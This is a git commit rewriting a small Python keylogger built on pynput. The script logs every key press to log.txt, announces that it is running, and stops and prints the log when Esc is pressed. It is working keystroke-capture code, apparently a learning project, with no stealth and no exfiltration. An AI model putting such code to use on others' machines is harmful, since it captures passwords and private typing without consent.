c1132737ed85612881057fbab3b3c69edbe38ff8
Tyla R <36782885+Tylasian@users.noreply.github.com>
2022-02-10 23:14:03 -0800

    final

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,28 @@
-from pynput.keyboard import Key, Listener
-import logging
+from pynput import keyboard
+import sys
 
-log_dir = ""
+class escException(Exception):pass
 
-logging.basicConfig(filename=(log_dir+"keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+def writeToFile(key):
+    keydata=str(key)
+    if key == keyboard.Key.esc: #if esc key is pressed, raise the exception that will terminate program
+        raise escException(key)
+    else:
+        with open("log.txt",'a') as file: #opens the log.txt file and prepares it to get appended
+            file.write(keydata + '\n') #writes recorded key presses to log.txt line by line
 
-def onPress(key):
-    logging.info(str(key))
+def printFile(): #prints all the recorded data in log.txt to the console
+    f = open('log.txt','r')
+    fileContent = f.read()
+    print(fileContent)
 
-with Listener(onPress=onPress) as listener:
-    listener.join()
+#main
+print("Keylogger has been activated! \nLogs will be in the log.txt file... \n[press 'esc' to stop the program]") #Console output that lets user know that the program is running and how to stop it
+
+with keyboard.Listener(on_press=writeToFile) as l:
+    try:
+        l.join() 
+    except escException as e:
+        print("{0} was pressed: terminating program & displaying log".format(e.args[0]))
+        printFile()
+        sys.exit(1) #forces program to stop 
